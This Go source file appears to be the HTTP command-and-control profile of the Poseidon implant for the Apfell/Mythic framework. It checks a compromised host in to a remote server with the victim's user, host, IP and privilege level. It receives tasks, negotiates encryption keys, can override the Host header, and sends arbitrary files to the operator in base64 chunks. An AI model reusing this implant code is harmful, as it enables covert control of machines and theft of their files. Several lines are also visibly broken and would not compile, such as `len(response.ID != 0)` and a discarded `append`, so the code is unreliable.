// +build default

package profiles

import (
	"bytes"
	"crypto/rsa"
	"encoding/base64"
	"encoding/json"
	"fmt"
	"io/ioutil"
	"log"
	"math"
	"net/http"
	"os"
	"strings"
	"time"

	"github.com/xorrior/poseidon/pkg/utils/crypto"
	"github.com/xorrior/poseidon/pkg/utils/functions"
	"github.com/xorrior/poseidon/pkg/utils/structs"
)

type C2Default struct {
	HostHeader     string
	BaseURL        string
	BaseURLs       []string
	Interval       int
	Commands       []string
	ExchangingKeys bool
	ApfellID       string
	UserAgent      string
	UUID           string
	AesPSK         string
	RsaPrivateKey  *rsa.PrivateKey
}

func newProfile() Profile {
	return &C2Default{}
}

func (c C2Default) Header() string {
	return c.HostHeader
}

func (c *C2Default) SetHeader(newHeader string) {
	c.HostHeader = newHeader
}

func (c C2Default) URL() string {
	if len(c.BaseURLs) == 0 {
		return c.BaseURL
	} else {
		return c.getRandomBaseURL()
	}
}

func (c *C2Default) getRandomBaseURL() string {
	return c.BaseURLs[seededRand.Intn(len(c.BaseURLs))]
}

func (c *C2Default) SetURL(newURL string) {
	c.BaseURL = newURL
}

func (c *C2Default) SetURLs(newURLs []string) {
	c.BaseURLs = newURLs
}

func (c C2Default) SleepInterval() int {
	return c.Interval
}

func (c *C2Default) SetSleepInterval(interval int) {
	c.Interval = interval
}

func (c C2Default) C2Commands() []string {
	return c.Commands
}

func (c *C2Default) SetC2Commands(commands []string) {
	c.Commands = commands
}

func (c C2Default) XKeys() bool {
	return c.ExchangingKeys
}

func (c *C2Default) SetXKeys(xkeys bool) {
	c.ExchangingKeys = xkeys
}

func (c C2Default) ApfID() string {
	return c.ApfellID
}

func (c *C2Default) SetApfellID(newApf string) {
	c.ApfellID = newApf
}

func (c C2Default) UniqueID() string {
	return c.UUID
}

func (c *C2Default) SetUniqueID(newID string) {
	c.UUID = newID
}

func (c *C2Default) SetUserAgent(ua string) {
	c.UserAgent = ua
}

func (c C2Default) GetUserAgent() string {
	return c.UserAgent
}

func (c C2Default) AesPreSharedKey() string {
	return c.AesPSK
}

func (c *C2Default) SetAesPreSharedKey(newKey string) {
	c.AesPSK = newKey
}

func (c C2Default) RsaKey() *rsa.PrivateKey {
	return c.RsaPrivateKey
}

func (c *C2Default) SetRsaKey(newKey *rsa.PrivateKey) {
	c.RsaPrivateKey = newKey
}

// CheckIn - check in a new agent
func (c *C2Default) CheckIn(ip string, pid int, user string, host string) map[string]interface{} {
	var resp []byte

	checkin := structs.CheckInMessage{}
	checkin.Action = "checkin"
	checkin.User = user
	checkin.Host = host
	checkin.IP = ip
	checkin.Pid = pid
	checkin.UUID = c.UUID
	if functions.IsElevated() {
		checkin.IntegrityLevel = 3
	} else {
		checkin.IntegrityLevel = 2
	}

	raw, _ := json.Marshal(checkin)
	//log.Printf("Sending checkin msg: %+v\n", checkin)

	if c.ExchangingKeys { // If exchangingKeys == true, then start EKE
		sID := c.NegotiateKey()

		endpoint := fmt.Sprintf("api/v%s/agent_message", ApiVersion)
		resp = c.htmlPostData(endpoint, raw)

	} else {

		endpoint := fmt.Sprintf("api/v%s/agent_message", ApiVersion) // If we're not using encryption, we hit the callbacks endpoint directly
		resp = c.htmlPostData(endpoint, raw)
		//log.Printf("Raw HTMLPostData response: %s\n", string(resp))
	}

	// save the apfell id
	response := structs.CheckInMessageResponse{}
	err := json.Unmarshal(resp, &response)
	//log.Printf("Raw response: %s", string(resp))
	if err != nil {
		log.Println("message:\n", string(resp))
		log.Printf("Error in unmarshal:\n %s", err.Error())
	}

	//log.Printf("Received ApfellID: %+v\n", c)

	if len(response.ID != 0) {
		c.UUID = response.ID // Assign new UUID for the agent to use in every request
		c.ApfellID = response.ID
	}

	return response
}

//GetTasking - retrieve new tasks
func (c *C2Default) GetTasking() interface{} {
	//log.Printf("Current C2Default config: %+v\n", c)
	url := fmt.Sprintf("%sapi/v%s/agent_message", c.BaseURL, ApiVersion)
	//request := structs.Msg{}
	request := structs.TaskRequestMessage{}
	request.Action = "get_tasking"
	request.TaskingSize = 1

	raw, err := json.Marshal(request)

	if err != nil {
		// log.Printf("")
	}

	rawTask := c.htmlGetData(url, raw)
	//log.Println("Raw HTMLGetData response: ", string(rawTask))

	task := structs.TaskRequestMessageResponse{}
	err = json.Unmarshal(rawTask, &task)

	if err != nil {
		//log.Printf("Error unmarshalling task data: %s", err.Error())
	}

	return task
}

//PostResponse - Post task responses
func (c *C2Default) PostResponse(task structs.Msg, output string) []byte {
	endpoint := fmt.Sprintf("api/v%s/agent_message", ApiVersion)
	return c.postRESTResponse(endpoint, []byte(output))
}

//postRESTResponse - Wrapper to post task responses through the Apfell rest API
func (c *C2Default) postRESTResponse(urlEnding string, data []byte) []byte {
	size := len(data)
	const dataChunk = 512000 //Normal apfell chunk size
	r := bytes.NewBuffer(data)
	chunks := uint64(math.Ceil(float64(size) / dataChunk))
	var retData bytes.Buffer

	for i := uint64(0); i < chunks; i++ {
		dataPart := int(math.Min(dataChunk, float64(int64(size)-int64(i*dataChunk))))
		dataBuffer := make([]byte, dataPart)

		_, err := r.Read(dataBuffer)
		if err != nil {
			//fmt.Sprintf("Error reading %s: %s", err)
			break
		}

		responseMsg := structs.TaskResponseMessage{}
		resp := structs.TaskResponse{}
		resp.Response = base64.StdEncoding.EncodeToString(dataBuffer)
		append(responseMsg.Responses, resp...)
		//tResp := structs.TaskResponse{}
		//tResp.Response = base64.StdEncoding.EncodeToString(dataBuffer)
		dataToSend, _ := json.Marshal(responseMsg)
		ret := c.htmlPostData(urlEnding, dataToSend)
		retData.Write(ret)
	}

	return retData.Bytes()
}

//htmlPostData HTTP POST function
func (c *C2Default) htmlPostData(endpoint string, sendData []byte) []byte {
	url := fmt.Sprintf("%s%s", c.BaseURL, endpoint)
	//log.Println("Sending POST request to url: ", url)
	// If the AesPSK is set, encrypt the data we send
	if len(c.AesPSK) != 0 {
		sendData = EncryptMessage(sendData, c.AesPSK)
		//sendData = c.encryptMessage(sendData)
	}

	sendData = append([]byte(c.UUID), sendData...)                 // Prepend the UUID
	sendData = []byte(base64.StdEncoding.EncodeToString(sendData)) // Base64 encode and convert to raw bytes
	req, _ := http.NewRequest("POST", url, bytes.NewBuffer(sendData))
	contentLength := len(sendData)
	req.ContentLength = int64(contentLength)
	req.Header.Set("User-Agent", c.UserAgent)
	// Set the host header if not empty
	if len(c.HostHeader) > 0 {
		//req.Header.Set("Host", c.HostHeader)
		req.Host = c.HostHeader
	}

	client := &http.Client{}
	resp, err := client.Do(req)

	if err != nil {
		//log.Printf("Error completing POST request %s", err.Error())
		return make([]byte, 0)
	}

	if resp.StatusCode != 200 {
		//log.Printf("Did not receive 200 response code: %s", resp.StatusCode)
		return make([]byte, 0)
	}

	defer resp.Body.Close()

	body, err := ioutil.ReadAll(resp.Body)

	if err != nil {
		//log.Printf("Error reading response body: %s", err.Error())
		return make([]byte, 0)
	}

	raw, err := base64.StdEncoding.DecodeString(string(body))
	if err != nil {
		return make([]byte, 0)
	}

	enc_raw := raw[36:] // Remove the Payload UUID
	// if the AesPSK is set and we're not in the midst of the key exchange, decrypt the response
	if len(c.AesPSK) != 0 && c.ExchangingKeys != true {
		//log.Printf("C2Default config in if: %+v\n", c)
		return DecryptMessage(enc_raw, c.AesPSK)
		//return c.decryptMessage(body)
	}

	return enc_raw
}

//htmlGetData - HTTP GET request for data
func (c *C2Default) htmlGetData(url string, body []byte) []byte {
	//log.Println("Sending HTML GET request to url: ", url)
	client := &http.Client{}
	var respBody []byte

	if len(c.AesPSK != 0 && len(body) > 0) {

		body = EncryptMessage(body, c.AesPSK) // Encrypt and then encapsulate the task request
	}

	body = append([]byte(c.UUID), body...)                         // Prepend the UUID to the body of the request
	body = base64.StdEncoding.EncodeToString(body)                 // Base64 the body
	req, err := http.NewRequest("GET", url, bytes.NewBuffer(body)) // Make the new request
	if err != nil {
		//fmt.Sprintf("Error completing GET request: %s", err)
		//log.Println("Error completing GET request: ", err.Error())
		return make([]byte, 0)
	}

	if len(c.HostHeader) > 0 {
		//req.Header.Set("Host", c.HostHeader)
		req.Host = c.HostHeader // Change the host header if specified
	}

	req.Header.Set("User-Agent", c.UserAgent)
	resp, err := client.Do(req)

	if err != nil {
		//log.Println("Error completing GET request: ", err.Error())
		return make([]byte, 0)
	}

	if resp.StatusCode != 200 {
		//log.Println("Did not receive 200 response code: ", resp.StatusCode)
		return make([]byte, 0)
	}

	defer resp.Body.Close()

	body, _ = ioutil.ReadAll(resp.Body)
	raw, err := base64.StdEncoding.DecodeString(string(body)) // Remove the base64
	enc_raw := raw[36:]                                       // Remove the prepended UUID

	if len(c.AesPSK) != 0 && c.ExchangingKeys != true {
		//return c.decryptMessage(respBody)
		return DecryptMessage(enc_raw, c.AesPSK) // If the AES PSK is set, decrypt the response body and return
	}

	return enc_raw

}

//NegotiateKey - EKE key negotiation
func (c *C2Default) NegotiateKey() string {
	sessionID := GenerateSessionID()
	pub, priv := crypto.GenerateRSAKeyPair()
	c.RsaPrivateKey = priv
	// Replace struct with dynamic json
	initMessage := structs.EkeKeyExchangeMessage{}
	initMessage.Action = "staging_rsa"
	initMessage.SessionID = sessionID
	initMessage.PubKey = base64.StdEncoding.EncodeToString(pub)

	// Encode and encrypt the json message
	raw, err := json.Marshal(initMessage)

	if err != nil {
		return ""
	}

	endpoint := fmt.Sprintf("api/v%s/agent_message", ApiVersion) // Send the request to the EKE endpoint

	resp := c.htmlPostData(endpoint, raw)

	decryptedResponse := crypto.RsaDecryptCipherBytes(resp, c.RsaKey()) // Decrypt & Unmarshal the response
	sessionKeyResp := structs.EkeKeyExchangeMessageResponse{}

	err = json.Unmarshal(decryptedResponse, &sessionKeyResp)
	if err != nil {
		return ""
	}

	c.AesPSK = sessionKeyResp.SessionKey // Save the new AES session key
	c.ExchangingKeys = false

	if len(sessionKeyResp.UUID) > 0 {
		c.UUID = sessionKeyResp.UUID // Save the new UUID
	}

	return sessionID
}

//SendFile - download a file
func (c *C2Default) SendFile(task structs.Task, params string) {
	//response := TaskResponse{}
	fileReq := structs.Msg{}
	//fileReq := structs.FileRegisterRequest{}
	fileReq["task"] = task.ID
	path := task.Params
	// Get the file size first and then the # of chunks required
	file, err := os.Open(path)

	if err != nil {
		tMsg := structs.ThreadMsg{}
		tMsg.Error = true
		tMsg.TaskItem = task
		tMsg.TaskResult = []byte(err.Error())
		return
	}

	fi, err := file.Stat()
	if err != nil {
		return
	}

	size := fi.Size()
	raw := make([]byte, size)
	file.Read(raw)

	c.SendFileChunks(task, raw)
}

// Get a file

func (c *C2Default) GetFile(fileid string) []byte {
	url := fmt.Sprintf("api/v%s/agent_message", ApiVersion)
	encfileData := c.htmlGetData(fmt.Sprintf("%s/%s", c.BaseURL, url))

	//decFileData := c.decryptMessage(encfileData)
	if len(encfileData) > 0 {
		rawData, _ := base64.StdEncoding.DecodeString(string(encfileData))
		return rawData
	}

	return make([]byte, 0)
}

//SendFileChunks - Helper function to deal with file chunks (screenshots and file downloads)
func (c *C2Default) SendFileChunks(task structs.Task, fileData []byte) {

	size := len(fileData)

	const fileChunk = 512000 //Normal apfell chunk size
	chunks := uint64(math.Ceil(float64(size) / fileChunk))

	//chunkResponse := structs.FileRegisterRequest{}
	chunkResponse := structs.Msg{}
	chunkResponse["total_chunks"] = int(chunks)
	chunkResponse["task"] = task.ID

	msg, _ := json.Marshal(chunkResponse)
	resp := c.PostResponse(task, string(msg))
	fileResp := structs.Msg{}

	err := json.Unmarshal(resp, &fileResp)

	if err != nil {
		return
	}

	r := bytes.NewBuffer(fileData)
	// Sleep here so we don't spam apfell
	time.Sleep(time.Duration(c.Interval) * time.Second)
	for i := uint64(0); i < chunks; i++ {

		partSize := int(math.Min(fileChunk, float64(int64(size)-int64(i*fileChunk))))
		partBuffer := make([]byte, partSize)
		// Create a temporary buffer and read a chunk into that buffer from the file
		read, err := r.Read(partBuffer)
		if err != nil || read == 0 {
			break
		}

		msg := structs.Msg{}
		msg["chunk_data"] = base64.StdEncoding.EncodeToString(partBuffer)
		msg["chunk_num"] = int(i) + 1
		msg["file_id"] = fileResp["file_id"]

		encmsg, _ := json.Marshal(msg)
		tResp := structs.Msg{}
		tResp.Response = base64.StdEncoding.EncodeToString(encmsg)
		dataToSend, _ := json.Marshal(tResp)

		endpoint := fmt.Sprintf("api/v1.3/responses/%s", task.ID) // TODO: update this for 1.4
		resp := c.htmlPostData(endpoint, dataToSend)
		postResp := structs.FileChunkResponse{}
		_ = json.Unmarshal(resp, &postResp)

		if !strings.Contains(postResp.Status, "success") {
			// If the post was not successful, wait and try to send it one more time
			time.Sleep(time.Duration(c.Interval) * time.Second)
			resp = c.htmlPostData(endpoint, encmsg)
		}
		time.Sleep(time.Duration(c.Interval) * time.Second)
	}

	c.PostResponse(task, "file downloaded")
}
